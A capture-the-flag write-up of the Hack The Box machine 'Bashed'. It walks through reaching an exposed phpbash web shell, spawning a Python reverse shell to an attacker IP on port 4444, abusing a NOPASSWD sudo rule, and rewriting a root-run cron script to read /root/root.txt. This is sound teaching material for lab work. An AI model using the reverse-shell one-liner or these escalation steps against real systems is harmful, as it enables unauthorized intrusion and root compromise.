# Hack The Box — Bashed

**Platform:** Hack The Box
**Machine Name:** Bashed
**OS:** Linux
**Difficulty:** Easy
**IP Address:** `10.129.78.26`

---

## Overview

Today we are back with another **Hack The Box Linux-based machine**, named **Bashed**.

Bashed is an easy-rated machine focused on **web enumeration, exposed web shells, Linux privilege escalation, and abuse of scheduled scripts**.

The initial foothold comes from discovering an exposed `phpbash` web shell inside the `/dev/` directory. From there, we obtain command execution as `www-data`, upgrade to a proper shell, and abuse `sudo` permissions to become `scriptmanager`.

The final privilege escalation involves the `/scripts` directory and a Python script that is executed with higher privileges.

```text
Port Scanning
      ↓
Apache Web Server
      ↓
Directory Enumeration
      ↓
/dev/ → phpbash
      ↓
www-data
      ↓
Reverse Shell
      ↓
sudo → scriptmanager
      ↓
/scripts/test.py
      ↓
Script Execution as Root
      ↓
Root Access
```

---

# Table of Contents

* [Machine Information](#machine-information)
* [Reconnaissance](#reconnaissance)
* [Port Scanning](#port-scanning)
* [Web Enumeration](#web-enumeration)
* [Discovering the Web Shell](#discovering-the-web-shell)
* [Initial Access](#initial-access)
* [User Flag](#user-flag)
* [Privilege Escalation to Scriptmanager](#privilege-escalation-to-scriptmanager)
* [Enumerating the Scripts Directory](#enumerating-the-scripts-directory)
* [Privilege Escalation to Root](#privilege-escalation-to-root)
* [Root Flag](#root-flag)
* [Attack Path Summary](#attack-path-summary)
* [Key Takeaways](#key-takeaways)
* [Tools Used](#tools-used)
* [Disclaimer](#disclaimer)

---

# Machine Information

| Information       | Details         |
| ----------------- | --------------- |
| Machine           | Bashed          |
| Platform          | Hack The Box    |
| OS                | Linux           |
| Difficulty        | Easy            |
| IP                | `10.129.78.26`  |
| Web Server        | Apache 2.4.18   |
| Initial User      | `www-data`      |
| Intermediate User | `scriptmanager` |
| Final Privilege   | `root`          |

---

# Reconnaissance

We begin by enumerating the target:

```text
10.129.78.26
```

The first step was a standard Nmap scan.

---

# Port Scanning

```bash
nmap 10.129.78.26
```

The scan returned only one open port:

```text
PORT   STATE SERVICE
80/tcp open  http
```

Only HTTP was exposed, so the web application became our primary attack surface.

We then performed service and version detection:

```bash
nmap -sC -sV 10.129.78.26
```

The result showed:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Additional information included:

```text
http-title: Arrexel's Development Site
http-server-header: Apache/2.4.18 (Ubuntu)
```

We also added the target to `/etc/hosts`:

```text
10.129.78.26 bashed.htb
```

This allowed us to access the application using:

```text
http://bashed.htb
```

---

# Web Enumeration

With the web server identified, we continued with web enumeration.

The page source contained an interesting reference:

```html
<a href="https://github.com/Arrexel/phpbash" target="_blank">phpbash</a>
```

This immediately suggested that the site was using or referencing **phpbash**, a browser-based PHP shell.

However, rather than assuming the exact location, we continued directory enumeration.

---

## Directory Fuzzing

We used a directory enumeration tool to discover additional paths.

The scan identified several interesting directories:

```text
/images/
/uploads/
/dev/
/php/
/js/
/css/
/fonts/
```

The most interesting discovery was:

```text
http://bashed.htb/dev/
```

The `/dev/` directory was accessible and exposed directory listing functionality.

---

# Discovering the Web Shell

Inside `/dev/`, we discovered two PHP files:

```text
phpbash.min.php
phpbash.php
```

These files provided an exposed browser-based shell.

Accessing the shell allowed us to execute commands directly on the target.

We verified the current identity with:

```bash
id
```

The result was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We also confirmed it with:

```bash
whoami
```

which returned:

```text
www-data
```

At this point, we had our initial foothold.

---

# Initial Access

Although the web shell provided command execution, we wanted a proper terminal-based shell.

We used Python to establish a reverse shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.95",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

This provided a more practical shell for further enumeration.

Our current context was:

```text
www-data
```

---

# User Flag

After obtaining the shell, we enumerated the home directories.

```bash
cd /home
```

We found the user:

```text
arrexel
```

Moving into the directory:

```bash
cd /home/arrexel
ls
```

revealed:

```text
user.txt
```

The user flag was then read with:

```bash
cat user.txt
```

This confirmed that we had successfully obtained the user-level flag.

---

# Privilege Escalation to Scriptmanager

The next step was privilege enumeration.

We checked the sudo permissions of `www-data`:

```bash
sudo -l
```

The output showed:

```text
Matching Defaults entries for www-data on bashed:
    env_reset,
    mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This was a major finding.

The `www-data` account was allowed to execute commands as the `scriptmanager` user without providing a password.

We used:

```bash
sudo -u scriptmanager -i
```

This changed our shell to:

```text
scriptmanager@bashed:~$
```

We had successfully escalated from:

```text
www-data
```

to:

```text
scriptmanager
```

---

# Enumerating the Scripts Directory

While investigating the filesystem, we found the `/scripts` directory.

The directory permissions were:

```text
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts
```

After becoming `scriptmanager`, we could access it:

```bash
cd /scripts
ls -lah
```

The directory contained:

```text
total 16K
drwxrwxr-- 2 scriptmanager scriptmanager 4.0K Jun  2 2022 .
drwxr-xr-x 23 root          root          4.0K Jun  2 2022 ..
-rw-r--r-- 1 scriptmanager scriptmanager   58 Dec  4 2017 test.py
-rw-r--r-- 1 root          root             12 Sep  2 20:05 test.txt
```

The Python script was:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close()
```

We also observed that `test.txt` was owned by root.

This indicated that the script was likely being executed by a higher-privileged process.

A tool such as `pspy64` can be useful in this situation to observe processes and identify scheduled execution.

---

# Privilege Escalation to Root

Since we controlled `test.py`, we could modify the Python script to perform an action with the privileges of the process executing it.

Instead of writing the original text, we modified the script to read the root flag and write it into `test.txt`.

We replaced the contents with:

```bash
echo 'f = open("test.txt", "w")' > test.py
echo 'f.write(open("/root/root.txt").read())' >> test.py
echo 'f.close()' >> test.py
```

The resulting script was:

```python
f = open("test.txt", "w")
f.write(open("/root/root.txt").read())
f.close()
```

If the script is executed with root privileges, it can read:

```text
/root/root.txt
```

and write its contents into:

```text
/scripts/test.txt
```

After the script executed, we could read the resulting file:

```bash
cat test.txt
```

This revealed the root flag.

---

# Root Flag

The root flag was located at:

```text
/root/root.txt
```

Our modified Python script caused the contents to be written into:

```text
/scripts/test.txt
```

We could then retrieve it using:

```bash
cat test.txt
```

This completed the privilege escalation path.

---

# Attack Path Summary

The complete attack chain was:

```text
                         Target
                            |
                            v
                     10.129.78.26
                            |
                            v
                      Port 80 / HTTP
                            |
                            v
                       Apache 2.4.18
                            |
                            v
                    Directory Enumeration
                            |
                            v
                         /dev/
                            |
                            v
                      phpbash.php
                            |
                            v
                         www-data
                            |
                            v
                      Reverse Shell
                            |
                            v
                       sudo -l
                            |
                            v
                     scriptmanager
                            |
                            v
                       /scripts/
                            |
                            v
                         test.py
                            |
                            v
                  Script executed as root
                            |
                            v
                           root
                            |
                       +----+----+
                       |         |
                       v         v
                   user.txt   root.txt
```

---

# Key Takeaways

* When only port `80` is exposed, web enumeration becomes especially important.
* Always inspect page source for references to technologies, frameworks, scripts, and development tools.
* Directory enumeration can reveal forgotten development directories and sensitive files.
* Exposed web shells can provide immediate command execution.
* Once a shell is obtained, always run:

```bash
sudo -l
```

* `NOPASSWD` sudo permissions can provide a direct path to another user.
* Writable scripts executed by a privileged process are an important privilege escalation vector.
* Process monitoring tools such as `pspy64` can help identify scheduled or repeated command execution.
* Always investigate file ownership and permissions when a script interacts with files owned by another user.
* After modifying a potentially privileged script, verify the resulting execution and privilege level.

---

# Tools Used

* Nmap
* Burp Suite
* Feroxbuster
* Python
* Netcat
* pspy64

---

# Final Notes

Bashed is a great beginner-friendly Linux machine that demonstrates a very realistic attack progression:

```text
Web Enumeration
      ↓
Exposed Development Files
      ↓
Web Shell
      ↓
www-data
      ↓
Sudo Misconfiguration
      ↓
scriptmanager
      ↓
Writable Privileged Script
      ↓
Root
```

The machine reinforces the importance of checking **development directories, exposed scripts, sudo permissions, file ownership, and scheduled processes** during a penetration test.

---

## Disclaimer

**Sita Ram**

This writeup is intended for **educational purposes and authorized security testing only**.

All testing described here was performed against a Hack The Box machine in an authorized lab environment. Do not attempt these techniques against systems you do not own or have explicit permission to test.
